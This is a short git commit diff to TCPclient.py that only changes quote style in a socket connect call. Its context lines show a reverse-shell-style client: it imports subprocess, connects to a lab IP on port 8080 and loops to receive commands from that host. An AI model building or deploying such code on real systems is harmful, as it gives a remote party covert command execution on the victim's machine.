d0932471e60f4b129723266db2b5df3cad373f03
tamani phiri <tamanigabriel0@gmail.com>
2023-10-22 10:00:20 +0200

    changes

--- TCPclient.py
+++ TCPclient.py
@@ -3,7 +3,7 @@ import subprocess
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.connect(("192.168.56.1", 8080))
+s.connect(('192.168.56.1', 8080))
 
 while True:
     command=s.recv(4096).decode('UTF-8')
